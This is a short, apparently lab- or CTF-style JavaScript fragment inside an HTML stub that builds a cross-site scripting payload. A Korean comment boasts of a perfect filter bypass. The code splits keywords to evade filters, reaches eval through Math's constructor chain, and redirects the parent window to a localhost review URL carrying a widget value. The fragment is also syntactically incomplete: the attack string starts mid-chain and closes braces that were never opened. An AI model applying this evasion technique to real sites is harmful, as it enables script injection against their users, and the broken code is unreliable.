<!DOCTYPE html>

        // 문자열 쪼개기 우회 및 싱크 구조 완벽 적용!
        const actualAttack =

            '["th" + "en"](r => r["te" + "xt"]())' +

                'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
            '});';

        const payload = '(Math["construc" + "tor"]["construc" + "tor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
